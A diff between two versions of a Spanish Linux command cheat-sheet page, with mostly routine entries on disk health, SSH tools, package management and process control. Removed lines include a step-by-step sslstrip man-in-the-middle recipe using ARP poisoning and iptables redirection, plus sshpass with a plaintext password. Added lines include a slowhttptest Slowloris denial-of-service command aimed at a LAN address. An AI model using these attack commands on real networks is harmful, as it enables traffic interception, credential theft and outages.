@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los &hellip;">
+  <meta name="description" content="[smartmontools]. Comprobar el estado de los discos duros. Si el disco es IDE, suprimir en todos los comandos el &#8220;-d ata&#8221; # smartctl -i -d &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -80,7 +80,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/sslstrip/">Sslstrip</a></h1>
+      <h1 class="entry-title"><a href="/blog/smartctl/">Smartctl</a></h1>
     
     
       <p class="meta">
@@ -96,267 +96,66 @@
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP].</p>
+  <div class="entry-content"><p>[smartmontools]. Comprobar el estado de los discos duros. Si el disco es IDE, suprimir en todos los comandos el &#8220;-d ata&#8221;</p>
 
-<p>Configuración de reenvío de paquetes IP:</p>
+<blockquote><p># smartctl -i -d ata /dev/sda (Verificar si un disco ATA suporta smart)</p>
 
-<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+<p># smartctl -s on -d ata /dev/hda (activar el soporte smart)</p>
 
-<p>Envenenamiento ARP (paquete dsniff):</p>
+<p># smartctl -d ata -t short /dev/sda (lanzar el test corto)</p>
 
-<blockquote><p># arpspoof -i eth0 -t ip_victima ip_router</p></blockquote>
+<p># smartctl -d ata -t long /dev/sda  (lanzar el test largo)</p>
 
-<p>En caso de querer atacar toda la red, solo especificar la ip router:</p>
+<p># smartctl -d ata -l selftest -i /dev/sda (analizar la información de los comandos anteriores)</p></blockquote>
 
-<blockquote><p># arpspoof -i eth0 ip_router</p></blockquote>
+<p>LifeTime indica las horas que el disco ha estado encendido. LBA_of_First_error indica los errores.</p>
 
-<p>Redirección de puertos usando Iptables:</p>
+<blockquote><p># smartctl -d ata -Hc /dev/sda (Si al final se lee PASSED, correcto, si FAILED cambiar disco)</p>
 
-<blockquote><p># iptables -t nat -A PREROUTING -p tcp &#8211;destination-port 80 -j REDIRECT &#8211;to-ports 31715</p></blockquote>
+<p># smartctl -d ata -l error /dev/sda (Listar los errores)</p>
 
-<p>Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar &#8220;-A&#8221; por un &#8220;-D&#8221; en el comando anterior.</p>
+<p># smartctl -d ara -A /dev/sda (Listar atributos internos)</p></blockquote>
 
-<p>Arrancar sslstrip y ponerlo a la escucha:</p>
+<p>Listado de algunos atributos smart</p>
 
-<blockquote><p># sslstrip -k -f -l 31715 -w archivo.log</p></blockquote>
+<p>Power_Cycle_Count (RAW_Value).- Veces que le ha llegado   corriente.</p>
 
-<p>Visionar en tiempo real los paquetes capturados:</p>
+<p>Temperature Celsius. (RAW_Value) .- Temperatura del disco</p>
 
-<blockquote><p>#  tail -f archivo.log</p></blockquote>
-</div>
-  
-  
+<p>Reallocated_Sector_Ct (RAW_Value).-  número de sectores de repuesto que ha usado el disco para sustituir sectores dañados</p>
 
+<p>Raw_Read_Error_Rate (RAW_Value).- Frequencia de errores en la lectura del disco.</p>
 
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/sshpass/">Sshpass</a></h1>
-    
-    
-      <p class="meta">
-        
+<p>Start_Stop_Count: Cantidad de veces que se ha parado y arrancado el disco</p>
 
+<p>Seek_Error_Rate: Tasa de errores de colocación de la aguja</p>
 
+<p>Power_On_Seconds: Tiempo funcionando</p>
 
+<p>Spin_Retry_Count: Numero de reintentos de arrancada</p>
 
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>La contraseña para acceder por ssh a un host remoto se realiza de forma interactiva (entrándola por teclado) en algunos casos esto no es posible ya sea por tratarse de un script en el que se entra en un host remoto, se realiza alguna acción y se regresa al local o por que se precisa entrar la contraseña de forma no interactiva. Para estos casos puede ser útil este comando aunque considerando lo debil para la seguridad que entraña su uso ya que puede quedar registrado en &#8220;history&#8221;.</p>
-
-<blockquote><p>$ sshpass -f file_pas ssh -y usuario@host ifconfig (Ejecuta ifconfig en el remoto entrando como contraseña la primera palabra del archivo file_pas )</p>
-
-<p>$ sshpass -p 1234 ssh -t usuario@host &#8220;echo 1234 | sudo -S namp 192.168.1.0/24&#8221; (Ejecuta el comando &#8220;sudo nmap&#8221; en el host remoto que tiene por contraseña 1234.)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/sshguard/">Sshguard</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Demonio que protege SSH y otros servicios contra ataques de fuerza bruta. Funciona observando los cambios en /var/log/auth.log, verificando si alguien esta fallando varias veces al autentificarse. Luego de varios errores de autentificacion (por defecto 14) el host ofensivo sera bloqueado por 7 minutos y se duplicará cada vez que el host ofensivo repita el ataque. Carece de archivo de configuración y puede complementarse con iptables:</p>
-
-<blockquote><p># iptables -A INPUT -j sshguard (Para activarlo en todos los puertos)</p>
-
-<p># iptables -A INPUT -m multiport -p tcp &#8211;destination-ports 21,22 -j sshguard (Para puertos concretos [ftp y ssh])</p></blockquote>
-
-<p>El archivo para colocar las direcciones no afectadas por sshguard:</p>
-
-<blockquote><p># nano /etc/sshguard/whitelist</p></blockquote>
-
-<p>Con el siguiente formato:</p>
-
-<pre><code>192.168.1.53 (Una ip)
-
-192.168.1.0/24 (Un rango)
-
-lapipaplena.net (Un host)
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/sshfs/">Sshfs</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Montar un sistema de archivos remoto en local.</p>
-
-<blockquote><p># sshfs usuario@host_o_IP:/home/usuario /home/usuario/remoto</p>
-
-<p># fusermount -u /home/usuario/remoto  (Desmontarlo)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/sshd/">Sshd</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Demonio ssh</p>
-
-<blockquote><p>$ sshd -t (Verificar si existen errores en el archivo de configuración)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/ssh-keygen/">Ssh-keygen</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Creación, gestión y conversión de claves utilizadas para la autenticación de cliente y servidor. Cuando no se especifica ninguna opción, ssh-keygen genera un par de claves RSA de 2048 bits y solicita un nombre de clave y una frase de paso para proteger la clave privada. Las claves públicas se crean usando el mismo nombre base que la clave privada con una extensión .pub añadida. La ubicación de la clave se muestra cuando se completa la generación de claves. Ver ssh</p>
-
-<blockquote><p>$ ssh-keygen -lvf ~/.ssh/known_hosts (Ver todas las huellas digitales y las imágenes randomart)</p>
-
-<p>$ ssh-keygen -t rsa -C newserver -f .ssh/newkey (Generar el par de llaves publica y privada. Caso de exitir preguntará si se sobreescribe)</p>
-
-<p>$ ssh-keygen -B -f .ssh/id_rsa.pub (Muestra la huella digital de la llave especificada en formato SHA-1)</p>
-
-<p>$ ssh-keygen -f &#8220;$HOME/.ssh/known_hosts&#8221; -R [La_URL.com_entre_corchetes]:22 (Suprimir un clave de un host por sufrir alguna modificación y el puerto)</p>
-
-<p>$ ssh-keygen -R HOST (Otra forma de suprimir una clave de un host modificado)</p></blockquote>
+<p>El campo VALUE [valor] va del número 1 al 253, siendo 1 el peor. Los valores normales son los que estan entre 100 y 200. El campo WHEN_FAILED indica cuando se produjo una falla de algún atributo.</p>
 
 <p>1.-</p>
 
-<p>Para ver la huella digital cada vez que se ingresa en un host remoto:</p>
+<p>Para activar el demonio que nos avisa si se produce un error en disco:</p>
 
-<blockquote><p># nano /etc/ssh/ssh_config</p></blockquote>
+<blockquote><p># apt-get install smart-notifier</p></blockquote>
 
-<p>Descomentar la linea y dejarla:</p>
+<p>Editar el archivo de configuración:</p>
 
-<p>VisualHostKey yes</p>
+<blockquote><p># nano /etc/default/smartmontools</p></blockquote>
+
+<p>Y descomentar la linea:</p>
+
+<p>start_smartd=yes</p>
 </div>
   
   
@@ -369,7 +168,7 @@ lapipaplena.net (Un host)
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/ssconvert/">Ssconvert</a></h1>
+      <h1 class="entry-title"><a href="/blog/slurm/">Slurm</a></h1>
     
     
       <p class="meta">
@@ -385,24 +184,16 @@ lapipaplena.net (Un host)
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>[gnumeric]. Conversor de formatos de hoja de cálculo por línea de comandos.</p>
+  <div class="entry-content"><p>Monitoriza la interfaz de red</p>
 
-<blockquote><p>$ ssconvert &#8211;list-exporters (Listado de conversiones de salida)</p>
-
-<p>$ ssconvert &#8211;list-importers (Litado de conversiones de entrada)</p>
-
-<p>$ ssconvert entrada.xls salida.csv (De formato excel a csv)</p>
-
-<p>$ ssconvert -E utf-8 entrada.xls salida.csv (Especificando una codificación para la salida)</p>
-
-<p>$ ssconvert &#8211;export-type=Gnumeric_stf:stf_assistant -O &#8216;separator=| format=preserve charset=unicode&#8217; entrada.xls salida.csv (Especificando opcionalmente un exportador [&#8211;export-type] que permite exportar a txt, especificando un separador de campos que no sea el por defecto [el espacio] sinó la barra vertical [|], preservando el formato de las celdas del original [format], otras opciones de format son &#8220;automatic&#8221; [por defecto] y &#8220;raw&#8221; [sin formato] y con codificación de salida en unicode [por defecto UTF-8])</p></blockquote>
+<blockquote><p># slurm -i eth0</p></blockquote>
 </div>
   
   
@@ -415,7 +206,7 @@ lapipaplena.net (Un host)
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/ss/">Ss</a></h1>
+      <h1 class="entry-title"><a href="/blog/slowhttptest/">Slowhttptest</a></h1>
     
     
       <p class="meta">
@@ -431,30 +222,40 @@ lapipaplena.net (Un host)
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Utilidad para investigar sockets. Sustituye a netstat.</p>
+  <div class="entry-content"><p>Efectuar ataques Slow Http Dos</p>
 
-<blockquote><p># ss -r  (resolviendo las IPs)</p>
+<blockquote><p>$ slowhttptest -c 1000 -H -g -o ataque -i 10 -r 200 -t GET -u http://192.168.1.154 -x 30 -p 3</p></blockquote>
 
-<p># ss -n  (sin resolver)</p>
+<p>c (Número de conexiones con límite en 65539)</p>
 
-<p># ss  (igual)</p>
+<p>H (ataque modo SlowLoris enviando paquetes sin completar)</p>
 
-<p># ss -l   (muestra los que estan esperando conexión)</p>
+<p>B (ataque modo Slow POST sin terminar de enviar el cuerpo del mensaje)</p>
 
-<p># ss -o  (con conexión establecida)</p>
+<p>X (ataque modo Slow Read de lectura de las respuestas http lentas)</p>
 
-<p># ss -p  (con la aplicación que los motiva)</p>
+<p>g (Generr estadistica en formato html)</p>
 
-<p># ss -a | grep ssh  (De todas las conexiones, solo muestra las ssh)</p>
+<p>o (Archivo de salida)</p>
 
-<p># ss -tpan &#8216;sport = :22&#8217; (ver conexiones por el puerto 22)</p></blockquote>
+<p>i (Intervalo de datos por segundo por conexión)</p>
+
+<p>r (Conexiones por segundo)</p>
+
+<p>t (Cabecera a utilizar)</p>
+
+<p>u (URL de destino)</p>
+
+<p>x (Longitud máxima de los datos)</p>
+
+<p>p (Tiempo de espera de respuesta http una vez el servidor se considera inaccesible)</p>
 </div>
   
   
@@ -467,7 +268,7 @@ lapipaplena.net (Un host)
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/srm/">Srm</a></h1>
+      <h1 class="entry-title"><a href="/blog/slim/">Slim</a></h1>
     
     
       <p class="meta">
@@ -483,22 +284,22 @@ lapipaplena.net (Un host)
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>[secure-delete]. Aplicación para eliminar de forma segura datos de disco sobreescribiendo su espacio. Es de funcionamiento lento, pero por eso se le considera el más efectivo</p>
+  <div class="entry-content"><p>Gestor de sesiones ligero. La configuración en el archivo /etc/slim.conf</p>
 
-<blockquote><p>$ srm -f dir (Modo rápido i el más inseguro)</p>
+<p>1.-</p>
 
-<p>$ srm -l dir (Como realizar dos veces srm -f)</p>
+<p>Si al usar systemd el sistema no para ni reinicia, modificar las lineas existentes por las siguientes:</p>
 
-<p>$ srm archivo.txt (Se sobreescribe 38 veces)</p>
+<p>halt_cmd /usr/bin/systemctl halt</p>
 
-<p>$ srm -rzv dir (se sobreescriben 38 veces los archivos y subdirectorios incluidos [r], sobreescribnedo ceros en el último borrado [z] y mostrando el proceso [v])</p></blockquote>
+<p>reboot_cmd /usr/bin/systemctl reboot</p>
 </div>
   
   
@@ -511,7 +312,7 @@ lapipaplena.net (Un host)
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/squid/">Squid</a></h1>
+      <h1 class="entry-title"><a href="/blog/sleep/">Sleep</a></h1>
     
     
       <p class="meta">
@@ -527,52 +328,258 @@ lapipaplena.net (Un host)
   
 
 
-<time datetime="2014-04-05T18:21:00+02:00" pubdate data-updated="true">05-04-2014</time>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Proxy caché (intermediario para nuestra conexion a internet, guardando las paginas visualizadas en una caché)</p>
+  <div class="entry-content"><p>Esperar el tiempo especificado antes de lanzar un comando o aplicacion</p>
 
-<blockquote><p># cp /etc/squid3/squid.conf{,.defaults} (Realizar copia de seguridad de la configuración)</p>
+<blockquote><p>$ sleep 5s ; xwd -root -screen > pantalla.xwd   (Capturar la pantallas tras 5 segundos)</p>
 
-<p># nano /etc/squid3/squid.conf</p></blockquote>
+<p>$ sleep 20m; yes > /dev/dsp (alarma. En 20 minutos suena un pitido)</p>
 
-<p>Modificamos/adaptamos los siguientes ajustes basicos:</p>
+<p>$ sleep 3s &amp;&amp; aoss espeak -v es &#8220;Levantate gandul&#8230;..&#8221; 2>/dev/null (Otra forma de programar una alarma)</p>
 
-<p>http_port 3128 #puerto de escucha</p>
+<p>$ sleep 3h &amp;&amp; halt (para el pc a las 3 horas)</p>
 
-<p>cache_mem 100 MB #Tamaño memoria caché</p>
+<p>$ sleep 3d &amp;&amp; halt (para el pc a los 3 dias)</p></blockquote>
+</div>
+  
+  
 
-<p>cache_dir ufs /var/spool/squid 700 16 256 #directorio y tamaño</p>
 
-<p>acl NuestraRed src 192.168.1.0/24 #Nombre y red a la que afecta</p>
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/slay/">Slay</a></h1>
+    
+    
+      <p class="meta">
+        
 
-<p>http_access allow NuestraRed #permitir acceso a toda la red</p>
 
-<p>http_access allow deny all #Denegamos a los de fuera de la red</p>
 
-<p>auth_param basic /usr/lib/squid/ncsa_auth /etc/squid/passwd #ruta a usuarios</p>
 
-<p>auth_param basic realm “Mensaje de acceso” #mensaje al logearse</p>
 
-<p>auth_param basic children 5 #Procesos de autentificación</p>
 
-<p>auth_param basic basic credentialsttl 1 hours #tiempo</p>
 
-<blockquote><p># squid3 -k parse (Revisión de la sintaxis del archivo squid.conf)</p></blockquote>
 
-<p>Después de las modificaciones reiniciar servicio:</p>
+  
 
-<blockquote><p># /etc/init.d/squid3 restart</p></blockquote>
 
-<p>Configuración de usuarios (/etc/squid/passwd):</p>
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
 
-<blockquote><p># htpasswd -c /etc/squid3/passwd user1 (Crear archivo [-c] nombre de usuario y pedirá contraseña)</p>
 
-<p># htpasswd /etc/squid3/passwd usuario2 (Sin parámetro -c porque el archivo ya está creado. Otro usuario y contraseña)</p></blockquote>
+  <div class="entry-content"><p>Matar todos los procesos de un usuario.</p>
+
+<blockquote><p>$ slay usuario</p>
+
+<p>$ slay -9 usuario</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/slackpkg/">Slackpkg</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Gestor de paquetes de Slackware sin resolución de dependencias. Como previa antes de su uso es preciso descomentar el repositorio de nuestra elección en /etc/slackpkg/mirrors</p>
+
+<blockquote><p># slackpkg update gpg (Bajar llaves publicas)</p>
+
+<p># slackpkg update (Recargar listado)</p>
+
+<p># slackpkg upgrade-all (Actualizar toda la distro)</p>
+
+<p># slackpkg search paquete (buscar paquete)</p>
+
+<p># slackpkg install paquete (instalar paquete)</p>
+
+<p># slackpkg upgrade paquete (actualiza el paquete elegido)</p>
+
+<p># slackpkg reinstall paquete (reinstala paquete)</p>
+
+<p># slackpkg remove paquete (desinstala paquete)</p>
+
+<p># slackpkg blacklist paquete (pone el paquete en lista negra)</p>
+
+<p># slackpkg download paquete (descarga paquete sin instalarlo)</p>
+
+<p># slackpkg info paquete (muestra informacion de paquete)</p>
+
+<p># slackpkg clean-system (Lista los paquetes obsoletos)</p>
+
+<p># slackpkg install-new (Lista los paquetes introducidos recientemente)</p>
+
+<p># slackpkg generate-template (Generar una plantilla de los paquetes instalados en un pc)</p>
+
+<p># slackpkg install-template (Instalar un slackware en un pc a partir de una plantilla))</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sl/">Sl</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Un tren en consola.</p>
+
+<blockquote><p>$ sl -a (Aparece la palabra “help” en la cabina)</p>
+
+<p>$ sl -l  (Muestra un tren más pequeño)</p>
+
+<p>$ sl -F  (El tren vuela)</p>
+
+<p>$ sl -e  (permite la interrupción con ^C)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/skill/">Skill</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Matar procesos.</p>
+
+<blockquote><p># skill -KILL -u usuario (Matar todos los procesos de un usuario)</p>
+
+<p># skill -STOP -u usurario (Parar los procesos de un usuario)</p>
+
+<p># skill -CONT -u usuario (Reactivarlos)</p>
+
+<p># skill -KILL -v /dev/pts/* (Cerrar todas las sesiones de un sistema)</p>
+
+<p># skill -p PID (Matar el proceso)</p>
+
+<p># skill -c firefox (Matar por nombre aplicación)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/skel/">Skel</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-07T07:13:00+02:00" pubdate data-updated="true">07-06-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Directorio [/etc/skel/] que contiene ficheros y directorios que son automaticamente copiados al directorio personal al crear un nuevo usuario [ver useradd]. Las modificaciones que puedan realizarse en este directorio, ya sea añadiendo carpetas o modificando parámetros [en .bashrc, .profile&#8230;] no se aplicarán a usuarios existentes, sólo a los de nueva creación.</p>
 </div>
   
   
@@ -603,43 +610,43 @@ lapipaplena.net (Un host)
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/nmap/">nmap</a>
+        <a href="/blog/zypper/">zypper</a>
       </li>
     
       <li class="post">
-        <a href="/blog/nethogs/">nethogs</a>
+        <a href="/blog/zmore/">zmore</a>
       </li>
     
       <li class="post">
-        <a href="/blog/lilo/">lilo</a>
+        <a href="/blog/zmap/">zmap</a>
       </li>
     
       <li class="post">
-        <a href="/blog/anarchism/">anarchism</a>
+        <a href="/blog/zless/">zless</a>
       </li>
     
       <li class="post">
-        <a href="/blog/sftp/">sftp</a>
+        <a href="/blog/zip/">zip</a>
       </li>
     
       <li class="post">
-        <a href="/blog/logrotate/">logrotate</a>
+        <a href="/blog/zgrep/">zgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/ssh/">ssh</a>
+        <a href="/blog/zfgrep/">zfgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/lshell/">lshell</a>
+        <a href="/blog/zenity/">zenity</a>
       </li>
     
       <li class="post">
-        <a href="/blog/apt-mirror/">apt-mirror</a>
+        <a href="/blog/zegrep/">zegrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/typeset/">typeset</a>
+        <a href="/blog/zdump/">zdump</a>
       </li>
     
   </ul>
